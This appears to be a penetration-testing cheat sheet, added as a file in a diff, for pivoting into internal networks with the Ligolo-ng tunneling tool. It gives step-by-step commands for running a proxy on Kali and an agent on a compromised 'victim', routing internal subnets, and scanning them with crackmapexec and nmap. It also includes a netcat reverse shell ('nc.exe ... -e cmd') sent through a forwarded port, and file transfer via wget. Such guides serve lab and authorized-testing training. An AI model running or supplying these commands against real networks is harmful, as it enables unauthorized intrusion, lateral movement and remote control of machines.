@@ -1,0 +1,119 @@
+Ligolo-ng Pivoting and Tunneling Setup
+======================================
+
+📥 Clone the Ligolo-ng Repo (if not already done)
+-------------------------------------------------
+cd ~/Tools
+git clone https://github.com/nicocha30/ligolo-ng.git
+cd ligolo-ng
+make  # or download precompiled binaries from GitHub releases
+
+If using precompiled binaries, extract them into ~/Tools/ligolo-ng/dist
+
+
+🛠️ Kali Setup (Listener Side)
+------------------------------
+
+1. Create and enable the TUN interface:
+   sudo ip tuntap add user kali mode tun ligolo
+   sudo ip link set ligolo up
+
+2. Start the Ligolo proxy listener:
+   cd ~/Tools/ligolo-ng/dist
+   ./ligolo-proxy -selfcert -laddr 0.0.0.0:443
+
+Note: You can use any port (e.g. 443, 8443). Port 443 is commonly allowed through firewalls.
+
+
+🎯 Agent Setup (Target Machine)
+-------------------------------
+
+On Linux target:
+   ./ligolo-agent -connect <KALI_IP>:443 -ignore-cert -relay -auto
+
+On Windows target:
+   .\ligolo-agent.exe -connect <KALI_IP>:443 -ignore-cert -relay -auto
+
+
+🔌 Establishing the Tunnel
+--------------------------
+On Kali, inside the Ligolo proxy shell:
+
+   session      # view active sessions
+   use 1        # or whichever session number
+   start        # begin tunneling
+
+
+🔍 Discover Internal Networks from Victim
+----------------------------------------
+From the target machine:
+
+   ip route
+   ifconfig
+   netstat -an
+
+
+📡 Route New Networks from Kali
+-------------------------------
+After identifying internal networks (e.g. 172.16.1.0/24), add them to your routing table:
+
+   sudo ip route add 172.16.1.0/24 dev ligolo
+   sudo ip route add 172.16.136.0/24 dev ligolo
+
+
+🧪 Internal Scanning
+--------------------
+Example:
+
+   crackmapexec smb 172.16.1.0/24
+
+Or:
+
+   nmap -sS -Pn -p 445 --open -iL internal_hosts.txt
+
+
+🔁 Add Internal Listeners (Port Forwarding)
+-------------------------------------------
+To forward traffic from internal machine to Kali:
+
+Example: Forward port 1234 from MS01 to Kali port 4444:
+
+   listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:4444
+   listener_list
+
+
+🐚 Reverse Shell via Port Forward
+---------------------------------
+From MS02, send a shell to MS01:1234 (which forwards to Kali:4444):
+
+   nc.exe 192.168.85.128 1234 -e cmd
+
+On Kali, listen with:
+
+   nc -lvnp 4444
+
+
+📁 File Transfer via Ligolo
+---------------------------
+Set up a listener to forward port 1235 to Kali:80:
+
+   listener_add --addr 0.0.0.0:1235 --to 127.0.0.1:80
+   listener_list
+
+On the internal machine (MS02 or others):
+
+   wget http://<MS01-IP>:1235/file.py
+
+
+✅ Summary of Key Commands
+--------------------------
+
+| Action                        | Command Example                                 |
+|------------------------------|--------------------------------------------------|
+| Create TUN device            | sudo ip tuntap add user kali mode tun ligolo    |
+| Set TUN up                   | sudo ip link set ligolo up                      |
+| Start Ligolo listener (Kali) | ./ligolo-proxy -selfcert -laddr 0.0.0.0:443     |
+| Start Ligolo agent (Target)  | ./ligolo-agent -connect KALI_IP:443 -ignore-cert -relay -auto |
+| Add routes                   | sudo ip route add 172.16.x.0/24 dev ligolo      |
+| Port forward a listener      | listener_add --addr 0.0.0.0:PORT --to 127.0.0.1:TARGET_PORT |
+
